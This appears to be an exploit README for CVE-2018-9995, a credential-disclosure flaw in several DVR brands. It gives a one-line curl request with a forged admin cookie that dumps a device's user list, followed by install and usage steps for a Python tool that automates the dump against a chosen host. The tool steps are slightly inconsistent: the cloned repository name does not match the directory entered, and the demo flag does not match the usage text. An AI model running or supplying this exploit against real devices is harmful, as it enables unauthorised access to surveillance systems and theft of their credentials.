[Tool] show DVR Credentiales
[*] Exploit Title:       "Gets DVR Credentials" 
[*] CVE:                 CVE-2018-9995
[*] CVSS Base Score v3:  7.3 / 10
[*] CVSS Vector String:  CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
[*] Date:                09/04/2018
[*] Exploit Author:      Fernandez Ezequiel ( twitter:@capitan_alfa )

$> Exploit:
curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
	
	tested in DVR (banner/vendor ?):
Novo
CeNova
QSee
Pulnix
XVR 5 in 1 (title: "XVR Login")
Securus,  - Security. Never Compromise !! - 
Night OWL
DVR Login
HVR Login
MDVR Login

TOOL: "Show all DVR Credentials"
Quick start
usr@pwn:~$ git clone https://github.com/YoZSploit/MOrooc
usr@pwn:~$ cd CVE-2018-9995_dvr_credentials
usr@pwn:~$ pip install -r requirements.txt
help
usage: Cam.py [-h] [-v] --host HOST [--port PORT]

[+] Obtaining Exposed credentials

optional arguments:
  -h, --help     show this help message and exit
  -v, --version  show program's version number and exit
  --host HOST    Host
  --port PORT    Port

[+] Demo: python Cam.py --host 192.168.1.101 -p 81
